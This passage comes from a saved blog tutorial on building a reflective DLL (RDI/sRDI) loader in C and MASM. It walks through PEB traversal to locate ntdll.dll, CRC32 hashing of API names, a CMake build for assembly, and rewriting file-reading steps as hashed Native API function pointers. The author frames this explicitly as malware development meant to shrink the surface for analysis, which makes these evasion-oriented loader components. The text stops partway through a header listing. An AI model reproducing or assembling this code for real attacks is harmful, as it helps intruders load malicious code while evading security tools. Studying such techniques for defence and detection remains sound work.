<p><code>xor rax, rax</code>: This sets the value of the <code>rax</code> register to zero, which is a common way to initialize a register before using it.</p>
</li>
<li>
<p><code>mov rax, gs:[60h]</code>: This retrieves the address of the PEB from the <code>gs</code> segment register, which is a register used by Windows for thread-local storage. The offset <code>60h</code> is the location of the PEB pointer within the TIB (Thread Information Block), which is another data structure used by Windows to store information about threads.</p>
</li>
<li>
<p><code>mov rax, [rax + 18h]</code>: This retrieves the address of the <code>Ldr</code> (Loader) member of the PEB, which is a pointer to a linked list of loaded modules.</p>
</li>
<li>
<p><code>mov rax, [rax + 20h]</code>: This retrieves the address of the first entry in the linked list, which corresponds to the main module of the process (i.e., the executable file itself).</p>
</li>
<li>
<p><code>mov rax, [rax]</code>: This retrieves the base address of the main module.</p>
</li>
<li>
<p><code>mov rax, [rax + 20h]</code>: This retrieves the address of the second entry in the linked list, which corresponds to <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>ret</code>: This returns the value of rax, which now contains the base address of <code>ntdll.dll</code>.</p>
</li>
</ol>
<!--kg-card-end: markdown--><p>The instructions would be slightly different for a 32-bit application, but since I am using 64-bit I will be using the above version.</p><!--kg-card-begin: html--><p>With the <code>peb.masm</code> creating a <code>get_ntdll()</code> function, we will need to add a line to the <code>peb.h</code> file to export the <code>get_ntdll()</code> function for usage </p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>peb.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/f93264135a5ccd4fc344a328d9bc1f05.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121783923" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-peb-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="peb.h">
        <tbody><tr>
          <td id="file-peb-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-peb-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-peb-h-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>defs.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-peb-h-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-peb-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SEED</span> <span class="pl-c1">0xDEADDEAD</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-peb-h-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">HASH</span>(<span class="pl-v">API</span>)(crc32b((<span class="pl-c1">uint8_t</span> *)API))</td>
        </tr>
        <tr>
          <td id="file-peb-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-peb-h-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-peb-h-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-k">extern</span> <span class="pl-k">void</span> *<span class="pl-en">get_ntdll</span>();</td>
        </tr>
        <tr>
          <td id="file-peb-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-peb-h-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-peb-h-LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> <span class="pl-en">crc32b</span>(<span class="pl-k">const</span> <span class="pl-c1">uint8_t</span> *str);</td>
        </tr>
        <tr>
          <td id="file-peb-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-peb-h-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-peb-h-LC11" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">get_proc_address_by_hash</span>(<span class="pl-k">void</span> *dll_address, <span class="pl-c1">uint32_t</span> function_hash);</td>
        </tr>
        <tr>
          <td id="file-peb-h-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-peb-h-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/f93264135a5ccd4fc344a328d9bc1f05/raw/061a487cfd634df710e3553b64fcd56da1eebda7/peb.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/f93264135a5ccd4fc344a328d9bc1f05#file-peb-h">
          peb.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>As you can see above, we added the line 7 so we can access the <code>get_ntdll()</code> MASM function from our C code.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p>With the above helper functions created, the last thing to do before moving on, is to setup our <code>CMakeLists.txt</code> configuration to setup MASM compiling, as well as other features to make things easier.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>CMakeLists.txt</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/572bf98c93a1159b3692c2b502eb929d.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121784185" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-cmakelists-txt" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-cmake  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="CMake" data-tagsearch-path="CMakeLists.txt">
        <tbody><tr>
          <td id="file-cmakelists-txt-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cmakelists-txt-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">cmake_minimum_required</span>(<span class="pl-k">VERSION</span> 3.24)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cmakelists-txt-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">project</span>(dll_loader C)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cmakelists-txt-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cmakelists-txt-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">set</span>(CMAKE_C_STANDARD 17)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cmakelists-txt-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">set</span>(MASM_NAMES src/masm/peb)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cmakelists-txt-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cmakelists-txt-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">include_directories</span>(<span class="pl-smi">${CMAKE_SOURCE_DIR}</span>/src/h)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cmakelists-txt-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cmakelists-txt-LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-k">FOREACH</span>(src <span class="pl-smi">${MASM_NAMES}</span>)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cmakelists-txt-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">SET</span>(MASM_SRC <span class="pl-smi">${CMAKE_CURRENT_SOURCE_DIR}</span>/<span class="pl-smi">${src}</span>.masm)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cmakelists-txt-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">SET</span>(MASM_OBJ <span class="pl-smi">${CMAKE_CURRENT_BINARY_DIR}</span>/<span class="pl-smi">${src}</span>.obj)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cmakelists-txt-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">ADD_CUSTOM_COMMAND</span>(</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cmakelists-txt-LC13" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">OUTPUT</span> <span class="pl-smi">${MASM_OBJ}</span></td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cmakelists-txt-LC14" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">COMMAND</span> C:/Temp/ml64.exe /c /Fo<span class="pl-smi">${MASM_OBJ}</span> <span class="pl-smi">${MASM_SRC}</span></td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cmakelists-txt-LC15" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">DEPENDS</span> <span class="pl-smi">${MASM_SRC}</span></td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cmakelists-txt-LC16" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">COMMENT</span> <span class="pl-s">"Assembling <span class="pl-smi">${MASM_SRC}</span>"</span>)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cmakelists-txt-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">SET</span>(MASM_OBJECTS <span class="pl-smi">${MASM_OBJECTS}</span> <span class="pl-smi">${MASM_OBJ}</span>)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-cmakelists-txt-LC18" class="blob-code blob-code-inner js-file-line"><span class="pl-k">ENDFOREACH</span>(src)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-cmakelists-txt-LC19" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-cmakelists-txt-LC20" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">add_executable</span>(dll_loader <span class="pl-smi">${MASM_OBJECTS}</span> main.c src/c/peb.c)</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/572bf98c93a1159b3692c2b502eb929d/raw/0054a62aa0fcfb4e70f1659b8c257b21b5d12501/CMakeLists.txt" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/572bf98c93a1159b3692c2b502eb929d#file-cmakelists-txt">
          CMakeLists.txt
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>In the above configuration, it will allow us to add our MASM files to be compiled and used as part of the C compilation process. It also allows each file within the project to add headers by name only, instead of adding the pathing for each.  You will notice I moved the <code>ml64.exe</code> binary to the <code>C:/Temp/</code> directory for the sake of testing, so you can either do the same, or use the full path to where <code>ml64.exe</code> exists within something like Visual Studio.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p>Now with the Cmake configuration done, we can move to the <code>main.c</code> file to start writing and setting up new functions and structures needed as we progress through <code>main.c</code>.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Within <code>main.c</code>, we are going to use the logic from each step in our basic loader, and rewrite it into Native API functions, with function pointer obfuscation. </p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/c09f566a77ef3bdbf796dab4fc5ae468.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121784442" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-pre-step-1-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="pre-step-1.c">
        <tbody><tr>
          <td id="file-pre-step-1-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-pre-step-1-c-LC1" class="blob-code blob-code-inner js-file-line"> HANDLE dll = CreateFileA(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>??<span class="pl-cce">\\</span>C:<span class="pl-cce">\\</span>Temp<span class="pl-cce">\\</span>dll_poc.dll<span class="pl-pds">"</span></span>, GENERIC_READ, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>, OPEN_EXISTING, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-pre-step-1-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-pre-step-1-c-LC2" class="blob-code blob-code-inner js-file-line"> DWORD64 dll_size = GetFileSize(dll, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-pre-step-1-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-pre-step-1-c-LC3" class="blob-code blob-code-inner js-file-line"> LPVOID dll_bytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dll_size);</td>
        </tr>
        <tr>
          <td id="file-pre-step-1-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-pre-step-1-c-LC4" class="blob-code blob-code-inner js-file-line"> DWORD out_size = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-pre-step-1-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-pre-step-1-c-LC5" class="blob-code blob-code-inner js-file-line"> <span class="pl-en">ReadFile</span>(dll, dll_bytes, dll_size, &amp;out_size, <span class="pl-c1">NULL</span>);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/c09f566a77ef3bdbf796dab4fc5ae468/raw/809a89667ed2453e4bc518926a9d60dc7d45f49f/pre-step-1.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/c09f566a77ef3bdbf796dab4fc5ae468#file-pre-step-1-c">
          pre-step-1.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above code is <i>Step 1</i> from our basic loader, and this code is basically just opening a file in read mode, reads the size of the file while allocating memory to store the data, before being read into the allocated memory via <code>ReadFile</code> function.</p><!--kg-card-end: html--><p>To rewrite these functions using the Native API, it's important to have a clear understanding of which functions are needed and how to set up function name hashes and function definitions for each of them. The following functions are required to replace those in the<em> Step 1</em> code above.</p><!--kg-card-begin: markdown--><ol>
<li><code>RtlInitUnicodeString</code> - is required to create unicode strings</li>
<li><code>NtCreateFile</code> - is required to replace CreateFileA</li>
<li><code>NtQueryInformationFile</code> - is required to get information about file</li>
<li><code>NtAllocateVirtualMemory</code> - is required to allocate memory for the file</li>
<li><code>NtReadFile</code> - is required to read file contents</li>
</ol>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>For these functions to work, we will need to add some new structures to our <code>structs.h</code> header file. This is due to the Native API calls relying on lower-level data structures that need to be added.</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><ol>
<li><code>UNICODE_STRING</code></li>
<li><code>OBJECT_ATTRIBUTES</code></li>
<li><code>IO_STATUS_BLOCK</code></li>
<li><code>FILE_STANDARD_INFORMATION</code></li>
<li><code>PIO_APC_ROUTINE</code></li>
</ol>
<!--kg-card-end: markdown--><p>Because this is a common theme in malware development, I am going to show you the sources I use to get the definitions for both structures and functions, and how I hash the names. &nbsp;</p><p>I often refer to the ntdll.dll header <a href="https://github.com/x64dbg/x64dbg/blob/development/src/dbg/ntdll/ntdll.h?ref=blog.malicious.group">file</a> used in the <em>x64dbg </em>project as a point of reference. Instead of including the entire file in my projects, I believe it's important to understand which functions use which structures. By adding only the necessary components, I can reduce the size of my project and potentially decrease the surface area for analysis. This approach also allows for a better understanding of the functions being used, as well as providing a more focused and streamlined development process.</p><!--kg-card-begin: html--><p>The first thing I do to resolve the function definitions is pull the function prototype from the ntdll.dll header file listed in the link above.  After pulling the functions prototypes, I copy them as seen in the <code>defs.h</code> file below.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>defs.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/85ad9da4c3fa44ee320a2aac61a07f8a.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121785042" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-defs-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="defs.h">
        <tbody><tr>
          <td id="file-defs-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-defs-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>structs.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-defs-h-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-defs-h-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCurrentThread</span>() ( (HANDLE)(LONG_PTR) -<span class="pl-c1">2</span> )</td>
        </tr>
        <tr>
          <td id="file-defs-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-defs-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCurrentProcess</span>() ( (HANDLE)(LONG_PTR) -<span class="pl-c1">1</span> )</td>
        </tr>
        <tr>
          <td id="file-defs-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-defs-h-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">RTL_CONSTANT_STRING</span>(<span class="pl-v">s</span>) { <span class="pl-k">sizeof</span>(s)-<span class="pl-k">sizeof</span>((s)[<span class="pl-c1">0</span>]), <span class="pl-k">sizeof</span>(s), s }</td>
        </tr>
        <tr>
          <td id="file-defs-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-defs-h-LC6" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">FILL_STRING</span>(<span class="pl-v">string, buffer</span>)                     \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-defs-h-LC7" class="blob-code blob-code-inner js-file-line">	string.Length = (USHORT)sl(buffer);             \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-defs-h-LC8" class="blob-code blob-code-inner js-file-line">	string.MaximumLength = string.Length;           \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-defs-h-LC9" class="blob-code blob-code-inner js-file-line">	string.Buffer = buffer</td>
        </tr>
        <tr>
          <td id="file-defs-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-defs-h-LC10" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">InitializeObjectAttributes</span>(<span class="pl-v"> p, n, a, r, s </span>) {   \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-defs-h-LC11" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">Length</span> = <span class="pl-k">sizeof</span>( OBJECT_ATTRIBUTES );          \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-defs-h-LC12" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">RootDirectory</span> = r;                             \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-defs-h-LC13" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">Attributes</span> = a;                                \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-defs-h-LC14" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">ObjectName</span> = n;                                \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-defs-h-LC15" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">SecurityDescriptor</span> = s;                        \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-defs-h-LC16" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">SecurityQualityOfService</span> = <span class="pl-c1">NULL</span>;               \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-defs-h-LC17" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-defs-h-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-defs-h-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-defs-h-LC19" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">VOID</span>     (__stdcall *PIO_APC_ROUTINE)(PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,ULONG Reserved);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-defs-h-LC20" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">VOID</span>     (__stdcall *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PWSTR SourceString);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-defs-h-LC21" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtCreateFile_t)(PHANDLE FileHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,PIO_STATUS_BLOCK IoStatusBlock,PLARGE_INTEGER AllocationSize,ULONG FileAttributes,ULONG ShareAccess,ULONG CreateDisposition,ULONG CreateOptions,PVOID EaBuffer,ULONG EaLength);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-defs-h-LC22" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-defs-h-LC23" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtQueryInformationFile_t)(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-defs-h-LC24" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtReadFile_t)(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID Buffer,ULONG Length,PLARGE_INTEGER <span class="pl-c1">ByteOffset</span>,PULONG Key);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/85ad9da4c3fa44ee320a2aac61a07f8a/raw/eac0cccd5d7a2508147c461c5653d4fa8468e0ce/defs.h" style="float:right">view raw</a>
